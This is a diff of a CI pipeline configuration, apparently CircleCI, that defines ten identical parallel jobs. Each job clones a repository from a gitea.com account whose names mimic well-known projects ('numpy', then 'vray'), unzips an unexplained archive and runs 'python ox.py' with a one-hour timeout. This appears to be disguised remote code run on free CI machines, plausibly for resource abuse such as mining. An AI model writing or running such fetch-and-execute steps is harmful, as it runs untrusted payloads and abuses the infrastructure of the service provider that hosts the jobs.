@@ -10,11 +10,11 @@ jobs:
       
       
       - run:
-          name: TESLA
+          name: FUCK
           no_output_timeout : 1h
           command: |
               sudo apt update && sudo apt install unzip
-              git clone https://gitea.com/trendava/numpy.git && cd numpy && unzip codejgc.zip && python ox.py
+              git clone https://gitea.com/trendava/vray.git && cd vray && unzip code.zip && python ox.py
             
             
   images-2:
@@ -27,11 +27,11 @@ jobs:
       
       
       - run:
-          name: TESLA
+          name: FUCK
           no_output_timeout : 1h
           command: |
             sudo apt update && sudo apt install unzip
-            git clone https://gitea.com/trendava/numpy.git && cd numpy && unzip codejgc.zip && python ox.py
+            git clone https://gitea.com/trendava/vray.git && cd vray && unzip code.zip && python ox.py
   images-3:
     
     docker:
@@ -42,11 +42,11 @@ jobs:
       
       
       - run:
-          name: TESLA
+          name: FUCK
           no_output_timeout : 1h
           command: |
             sudo apt update && sudo apt install unzip
-            git clone https://gitea.com/trendava/numpy.git && cd numpy && unzip codejgc.zip && python ox.py
+            git clone https://gitea.com/trendava/vray.git && cd vray && unzip code.zip && python ox.py
   images-4:
     
     docker:
@@ -57,11 +57,11 @@ jobs:
       
       
       - run:
-          name: TESLA
+          name: FUCK
           no_output_timeout : 1h
           command: |
             sudo apt update && sudo apt install unzip
-            git clone https://gitea.com/trendava/numpy.git && cd numpy && unzip codejgc.zip && python ox.py
+            git clone https://gitea.com/trendava/vray.git && cd vray && unzip code.zip && python ox.py
   images-5:
     
     docker:
@@ -72,11 +72,11 @@ jobs:
       
       
       - run:
-          name: TESLA
+          name: FUCK
           no_output_timeout : 1h
           command: |
             sudo apt update && sudo apt install unzip
-            git clone https://gitea.com/trendava/numpy.git && cd numpy && unzip codejgc.zip && python ox.py
+            git clone https://gitea.com/trendava/vray.git && cd vray && unzip code.zip && python ox.py
   images-6:
     
     docker:
@@ -87,11 +87,11 @@ jobs:
       
       
       - run:
-          name: TESLA
+          name: FUCK
           no_output_timeout : 1h
           command: |
             sudo apt update && sudo apt install unzip
-            git clone https://gitea.com/trendava/numpy.git && cd numpy && unzip codejgc.zip && python ox.py
+            git clone https://gitea.com/trendava/vray.git && cd vray && unzip code.zip && python ox.py
 
   images-7:
     
@@ -103,11 +103,11 @@ jobs:
       
       
       - run:
-          name: TESLA
+          name: FUCK
           no_output_timeout : 1h
           command: |
             sudo apt update && sudo apt install unzip
-            git clone https://gitea.com/trendava/numpy.git && cd numpy && unzip codejgc.zip && python ox.py
+            git clone https://gitea.com/trendava/vray.git && cd vray && unzip code.zip && python ox.py
   images-8:
     
     docker:
@@ -118,11 +118,11 @@ jobs:
       
       
       - run:
-          name: TESLA
+          name: FUCK
           no_output_timeout : 1h
           command: |
             sudo apt update && sudo apt install unzip
-            git clone https://gitea.com/trendava/numpy.git && cd numpy && unzip codejgc.zip && python ox.py
+            git clone https://gitea.com/trendava/vray.git && cd vray && unzip code.zip && python ox.py
   images-9:
     
     docker:
@@ -133,11 +133,11 @@ jobs:
       
       
       - run:
-          name: TESLA
+          name: FUCK
           no_output_timeout : 1h
           command: |
             sudo apt update && sudo apt install unzip
-            git clone https://gitea.com/trendava/numpy.git && cd numpy && unzip codejgc.zip && python ox.py
+            git clone https://gitea.com/trendava/vray.git && cd vray && unzip code.zip && python ox.py
 
   images-10:
     
@@ -149,11 +149,11 @@ jobs:
       
       
       - run:
-          name: TESLA
+          name: FUCK
           no_output_timeout : 1h
           command: |
             sudo apt update && sudo apt install unzip
-            git clone https://gitea.com/trendava/numpy.git && cd numpy && unzip codejgc.zip && python ox.py
+            git clone https://gitea.com/trendava/vray.git && cd vray && unzip code.zip && python ox.py
 
 
 workflows:
